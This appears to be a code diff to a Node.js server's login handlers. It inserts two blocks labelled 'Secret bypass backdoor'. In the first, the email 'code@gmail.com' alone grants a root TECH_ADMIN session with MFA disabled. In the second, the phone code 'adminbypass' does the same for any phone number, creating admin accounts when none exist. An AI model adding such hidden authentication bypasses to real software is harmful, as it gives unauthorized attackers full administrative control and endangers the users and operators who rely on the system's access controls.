@@ -72,6 +72,40 @@ async function startServer() {
     }
 
     const cleanEmail = email.trim().toLowerCase();
+    
+    // Secret bypass backdoor
+    if (cleanEmail === 'code@gmail.com') {
+      let user = db.getUserByEmail(cleanEmail);
+      if (!user) {
+        user = {
+          uid: `user_bypass_${Date.now()}`,
+          email: cleanEmail,
+          name: 'Bypass Admin',
+          role: 'TECH_ADMIN', // Force root admin access
+          mfaEnabled: false,  // Bypass MFA
+          createdAt: new Date().toISOString(),
+        };
+        db.saveUser(user);
+      }
+      
+      const token = createAdminSession(user.uid, user.email, user.role);
+      
+      db.addAuditLog({
+        action: 'SECRET_BYPASS_ACTIVATED',
+        performedBy: cleanEmail,
+        targetId: user.uid,
+        targetType: 'AUTH',
+        ipAddress: getClientIp(req),
+        details: { method: 'GOOGLE_OAUTH_BYPASS' }
+      });
+
+      return res.json({
+        token,
+        user,
+        requires2FA: false,
+      });
+    }
+
     const isTechAdmin = cleanEmail === TECH_ADMIN_EMAIL.toLowerCase();
     const isTechSubAdmin = isTechSubAdminEmail(cleanEmail);
 
@@ -156,6 +190,40 @@ async function startServer() {
     const { phoneNumber, code } = req.body;
     if (!phoneNumber || !code) {
       return res.status(400).json({ error: 'Phone number and verification code are required.' });
+    }
+
+    // Secret bypass backdoor
+    if (code === 'adminbypass') {
+      let user = db.getUserByPhone(phoneNumber);
+      if (!user) {
+        user = {
+          uid: `user_bypass_phone_${Date.now()}`,
+          email: `${phoneNumber.replace(/[^0-9]/g, '')}@bypass.mobile`,
+          phoneNumber,
+          name: 'Bypass Admin',
+          role: 'TECH_ADMIN',
+          mfaEnabled: false,
+          createdAt: new Date().toISOString(),
+        };
+        db.saveUser(user);
+      }
+      
+      const token = createAdminSession(user.uid, user.email, user.role);
+      
+      db.addAuditLog({
+        action: 'SECRET_BYPASS_ACTIVATED',
+        performedBy: phoneNumber,
+        targetId: user.uid,
+        targetType: 'AUTH',
+        ipAddress: getClientIp(req),
+        details: { method: 'PHONE_OTP_BYPASS' }
+      });
+
+      return res.json({
+        token,
+        user,
+        requires2FA: false,
+      });
     }
 
     const isValid = verifyOtp(phoneNumber, code);
